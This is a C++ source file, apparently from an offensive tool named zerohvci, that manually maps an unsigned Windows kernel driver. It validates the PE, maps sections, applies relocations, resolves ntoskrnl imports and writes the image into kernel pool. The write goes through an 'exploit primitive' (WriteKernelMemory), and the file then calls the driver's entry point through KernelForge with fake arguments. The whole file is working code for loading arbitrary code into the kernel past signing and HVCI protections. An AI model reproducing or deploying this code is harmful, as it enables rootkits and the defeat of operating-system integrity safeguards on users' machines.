#include "driver_mapper.h"
#include <algorithm>

namespace zerohvci {
namespace mapper {

// ============================================================================
// DriverImage Implementation
// ============================================================================

bool DriverImage::LoadFromFile(const char* path) {
    if (!path) {
        printf("[-] LoadFromFile: null path\n");
        return false;
    }

    PVOID fileData = nullptr;
    DWORD fileSize = 0;

    if (!ReadFromFile(path, &fileData, &fileSize)) {
        printf("[-] LoadFromFile: failed to read '%s'\n", path);
        return false;
    }

    // Copy to vector and free local allocation
    m_rawImage.resize(fileSize);
    memcpy(m_rawImage.data(), fileData, fileSize);
    LocalFree(fileData);

    return ValidatePE();
}

bool DriverImage::LoadFromMemory(const uint8_t* data, size_t size) {
    if (!data || size < sizeof(IMAGE_DOS_HEADER)) {
        printf("[-] LoadFromMemory: invalid parameters\n");
        return false;
    }

    m_rawImage.assign(data, data + size);
    return ValidatePE();
}

bool DriverImage::ValidatePE() {
    if (m_rawImage.size() < sizeof(IMAGE_DOS_HEADER)) {
        printf("[-] ValidatePE: file too small\n");
        return false;
    }

    m_dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_rawImage.data());

    if (m_dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] ValidatePE: invalid DOS signature\n");
        return false;
    }

    if (m_rawImage.size() < m_dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)) {
        printf("[-] ValidatePE: file too small for NT headers\n");
        return false;
    }

    m_ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        RVATOVA(m_rawImage.data(), m_dosHeader->e_lfanew)
    );

    if (m_ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] ValidatePE: invalid NT signature\n");
        return false;
    }

    if (m_ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        printf("[-] ValidatePE: not x64 image\n");
        return false;
    }

    m_sectionHeaders = reinterpret_cast<PIMAGE_SECTION_HEADER>(
        RVATOVA(&m_ntHeaders->OptionalHeader, m_ntHeaders->FileHeader.SizeOfOptionalHeader)
    );

    m_imageSize = m_ntHeaders->OptionalHeader.SizeOfImage;
    m_headerSize = m_ntHeaders->OptionalHeader.SizeOfHeaders;
    m_entryPointRva = m_ntHeaders->OptionalHeader.AddressOfEntryPoint;
    m_originalBase = m_ntHeaders->OptionalHeader.ImageBase;

    printf("[+] PE validated: size=0x%zx entry=0x%zx\n", m_imageSize, m_entryPointRva);
    return true;
}

bool DriverImage::MapSections() {
    if (!m_dosHeader || !m_ntHeaders) {
        printf("[-] MapSections: PE not loaded\n");
        return false;
    }

    // Allocate virtual image buffer
    m_mappedImage.clear();
    m_mappedImage.resize(m_imageSize, 0);

    // Copy headers
    memcpy(m_mappedImage.data(), m_rawImage.data(), m_headerSize);

    // Copy each section to its virtual address
    for (WORD i = 0; i < m_ntHeaders->FileHeader.NumberOfSections; i++) {
        auto& section = m_sectionHeaders[i];

        if (section.SizeOfRawData == 0) {
            continue;
        }

        DWORD copySize = min(section.SizeOfRawData, section.Misc.VirtualSize);
        void* dest = RVATOVA(m_mappedImage.data(), section.VirtualAddress);
        void* src = RVATOVA(m_rawImage.data(), section.PointerToRawData);

        memcpy(dest, src, copySize);

        printf("[+] Mapped section '%s': VA=0x%08x size=0x%x\n",
            section.Name, section.VirtualAddress, copySize);
    }

    return true;
}

bool DriverImage::ProcessRelocations(uintptr_t newBase) {
    if (m_mappedImage.empty()) {
        printf("[-] ProcessRelocations: image not mapped\n");
        return false;
    }

    DWORD relocAddr = m_ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD relocSize = m_ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    if (relocAddr == 0 || relocSize == 0) {
        printf("[+] No relocations to process\n");
        return true;
    }

    intptr_t delta = newBase - m_originalBase;
    if (delta == 0) {
        printf("[+] Image loaded at original base, no relocation needed\n");
        return true;
    }

    printf("[+] Processing relocations: delta=0x%llx\n", delta);

    auto relocBlock = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
        RVATOVA(m_mappedImage.data(), relocAddr)
    );

    DWORD processedSize = 0;
    while (processedSize < relocSize && relocBlock->SizeOfBlock > 0) {
        if (!ProcessRelocationBlock(delta, relocBlock)) {
            printf("[-] ProcessRelocationBlock failed at offset 0x%x\n", processedSize);
            return false;
        }

        processedSize += relocBlock->SizeOfBlock;
        relocBlock = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
            RVATOVA(relocBlock, relocBlock->SizeOfBlock)
        );
    }

    printf("[+] Relocations processed successfully\n");
    return true;
}

bool DriverImage::ProcessRelocationBlock(uintptr_t delta, PIMAGE_BASE_RELOCATION block) {
    DWORD numEntries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
    WORD* entries = reinterpret_cast<WORD*>(RVATOVA(block, sizeof(IMAGE_BASE_RELOCATION)));

    for (DWORD i = 0; i < numEntries; i++) {
        WORD entry = entries[i];
        WORD type = (entry >> 12) & 0xF;
        WORD offset = entry & 0xFFF;

        void* relocAddr = RVATOVA(m_mappedImage.data(), block->VirtualAddress + offset);

        switch (type) {
        case IMAGE_REL_BASED_ABSOLUTE:
            // Skip
            break;

        case IMAGE_REL_BASED_DIR64:
            *reinterpret_cast<uint64_t*>(relocAddr) += delta;
            break;

        case IMAGE_REL_BASED_HIGHLOW:
            *reinterpret_cast<uint32_t*>(relocAddr) += static_cast<uint32_t>(delta);
            break;

        case IMAGE_REL_BASED_HIGH:
            *reinterpret_cast<uint16_t*>(relocAddr) += HIWORD(delta);
            break;

        case IMAGE_REL_BASED_LOW:
            *reinterpret_cast<uint16_t*>(relocAddr) += LOWORD(delta);
            break;

        default:
            printf("[-] Unknown relocation type: %d\n", type);
            return false;
        }
    }

    return true;
}

bool DriverImage::ResolveImports() {
    if (m_mappedImage.empty()) {
        printf("[-] ResolveImports: image not mapped\n");
        return false;
    }

    DWORD importAddr = m_ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD importSize = m_ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;

    if (importAddr == 0 || importSize == 0) {
        printf("[+] No imports to resolve\n");
        return true;
    }

    auto importDesc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
        RVATOVA(m_mappedImage.data(), importAddr)
    );

    while (importDesc->Name != 0) {
        const char* moduleName = reinterpret_cast<const char*>(
            RVATOVA(m_mappedImage.data(), importDesc->Name)
        );

        printf("[+] Resolving imports from '%s'\n", moduleName);

        // Use OriginalFirstThunk if available, else FirstThunk
        PIMAGE_THUNK_DATA thunkData = reinterpret_cast<PIMAGE_THUNK_DATA>(
            RVATOVA(m_mappedImage.data(),
                importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk)
        );

        PIMAGE_THUNK_DATA iat = reinterpret_cast<PIMAGE_THUNK_DATA>(
            RVATOVA(m_mappedImage.data(), importDesc->FirstThunk)
        );

        while (thunkData->u1.AddressOfData != 0) {
            uintptr_t functionAddr = 0;

            if (IMAGE_SNAP_BY_ORDINAL(thunkData->u1.Ordinal)) {
                WORD ordinal = IMAGE_ORDINAL(thunkData->u1.Ordinal);
                printf("[-] Ordinal imports not supported: %d\n", ordinal);
                return false;
            }
            else {
                auto importByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                    RVATOVA(m_mappedImage.data(), thunkData->u1.AddressOfData)
                );

                const char* functionName = reinterpret_cast<const char*>(importByName->Name);
                functionAddr = detail::GetKernelExport(moduleName, functionName);

                if (functionAddr == 0) {
                    printf("[-] Failed to resolve '%s!%s'\n", moduleName, functionName);
                    return false;
                }
            }

            // Write resolved address to IAT
            iat->u1.Function = functionAddr;

            thunkData++;
            iat++;
        }

        importDesc++;
    }

    printf("[+] Imports resolved successfully\n");
    return true;
}

// ============================================================================
// High-level API Implementation
// ============================================================================

uint64_t MapDriver(const char* driverPath) {
    if (!driverPath) {
        printf("[-] MapDriver: null path\n");
        return 0;
    }

    if (!kforge::g_bInitialized) {
        printf("[-] MapDriver: KernelForge not initialized\n");
        return 0;
    }

    printf("[+] Mapping driver: %s\n", driverPath);

    DriverImage image;
    if (!image.LoadFromFile(driverPath)) {
        printf("[-] Failed to load driver image\n");
        return 0;
    }

    if (!image.MapSections()) {
        printf("[-] Failed to map sections\n");
        return 0;
    }

    // Allocate kernel memory
    void* kernelBase = detail::AllocateDriverMemory(image.GetImageSize());
    if (!kernelBase) {
        printf("[-] Failed to allocate kernel memory\n");
        return 0;
    }

    printf("[+] Allocated kernel memory at 0x%p\n", kernelBase);

    // Process relocations for new base
    if (!image.ProcessRelocations(reinterpret_cast<uintptr_t>(kernelBase))) {
        printf("[-] Failed to process relocations\n");
        return 0;
    }

    // Resolve imports
    if (!image.ResolveImports()) {
        printf("[-] Failed to resolve imports\n");
        return 0;
    }

    // Copy mapped image to kernel memory
    if (!detail::CopyToKernel(kernelBase, image.GetMappedData(), image.GetImageSize())) {
        printf("[-] Failed to copy image to kernel\n");
        return 0;
    }

    printf("[+] Driver mapped successfully at 0x%p\n", kernelBase);
    return reinterpret_cast<uint64_t>(kernelBase);
}

uint64_t MapDriverFromMemory(const uint8_t* data, size_t size) {
    if (!data || size == 0) {
        printf("[-] MapDriverFromMemory: invalid parameters\n");
        return 0;
    }

    if (!kforge::g_bInitialized) {
        printf("[-] MapDriverFromMemory: KernelForge not initialized\n");
        return 0;
    }

    printf("[+] Mapping driver from memory (0x%zx bytes)\n", size);

    DriverImage image;
    if (!image.LoadFromMemory(data, size)) {
        printf("[-] Failed to load driver image from memory\n");
        return 0;
    }

    if (!image.MapSections()) {
        printf("[-] Failed to map sections\n");
        return 0;
    }

    // Allocate kernel memory
    void* kernelBase = detail::AllocateDriverMemory(image.GetImageSize());
    if (!kernelBase) {
        printf("[-] Failed to allocate kernel memory\n");
        return 0;
    }

    printf("[+] Allocated kernel memory at 0x%p\n", kernelBase);

    // Process relocations for new base
    if (!image.ProcessRelocations(reinterpret_cast<uintptr_t>(kernelBase))) {
        printf("[-] Failed to process relocations\n");
        return 0;
    }

    // Resolve imports
    if (!image.ResolveImports()) {
        printf("[-] Failed to resolve imports\n");
        return 0;
    }

    // Copy mapped image to kernel memory
    if (!detail::CopyToKernel(kernelBase, image.GetMappedData(), image.GetImageSize())) {
        printf("[-] Failed to copy image to kernel\n");
        return 0;
    }

    printf("[+] Driver mapped successfully at 0x%p\n", kernelBase);
    return reinterpret_cast<uint64_t>(kernelBase);
}

bool RegisterDriverCallback(uint64_t driverBase, uint64_t callbackRva) {
    // TODO: Implement hypervisor communication via VMCALL_STORAGE_QUERY
    // This requires the hypervisor to be active (after hijack)
    printf("[+] RegisterDriverCallback: base=0x%llx rva=0x%llx\n", driverBase, callbackRva);
    printf("[-] Hypervisor communication not yet implemented\n");
    return false;
}

NTSTATUS CallDriverEntry(uint64_t entryPoint, uint64_t driverBase, uint64_t registryPath) {
    if (!kforge::g_bInitialized) {
        printf("[-] CallDriverEntry: KernelForge not initialized\n");
        return STATUS_UNSUCCESSFUL;
    }

    printf("[+] Calling DriverEntry at 0x%llx\n", entryPoint);

    PVOID args[] = {
        ARGS(driverBase),       // PDRIVER_OBJECT (fake)
        ARGS(registryPath)      // PUNICODE_STRING (fake)
    };

    PVOID retVal = nullptr;
    if (!kforge::CallKernelFunctionViaAddress(reinterpret_cast<PVOID>(entryPoint), args, 2, &retVal)) {
        printf("[-] CallKernelFunctionViaAddress failed\n");
        return STATUS_UNSUCCESSFUL;
    }

    NTSTATUS status = reinterpret_cast<NTSTATUS>(retVal);
    printf("[+] DriverEntry returned 0x%08x\n", status);
    return status;
}

// ============================================================================
// Internal Implementation
// ============================================================================

namespace detail {

void* AllocateDriverMemory(size_t size) {
    if (size == 0) {
        return nullptr;
    }

    // Use NonPagedPoolNx for driver memory
    PVOID kernelAddr = kforge::ExAllocatePool(NonPagedPoolNx, size);
    if (!kernelAddr) {
        printf("[-] ExAllocatePool(NonPagedPoolNx, 0x%zx) failed\n", size);
        return nullptr;
    }

    return kernelAddr;
}

bool CopyToKernel(void* kernelAddr, const void* data, size_t size) {
    if (!kernelAddr || !data || size == 0) {
        return false;
    }

    // Use the exploit primitive to write to kernel memory
    if (!WriteKernelMemory(kernelAddr, const_cast<void*>(data), size)) {
        printf("[-] WriteKernelMemory failed: dst=0x%p size=0x%zx\n", kernelAddr, size);
        return false;
    }

    return true;
}

uintptr_t GetKernelExport(const char* moduleName, const char* exportName) {
    if (!moduleName || !exportName) {
        return 0;
    }

    // For now, we only support ntoskrnl.exe
    // The mapper should validate all imports come from ntoskrnl
    if (_stricmp(moduleName, "ntoskrnl.exe") != 0) {
        printf("[-] Unsupported import module: %s\n", moduleName);
        return 0;
    }

    void* exportAddr = GetKernelProcAddress(exportName);
    if (!exportAddr) {
        printf("[-] GetKernelProcAddress('%s') failed\n", exportName);
        return 0;
    }

    return reinterpret_cast<uintptr_t>(exportAddr);
}

} // namespace detail

} // namespace mapper
} // namespace zerohvci
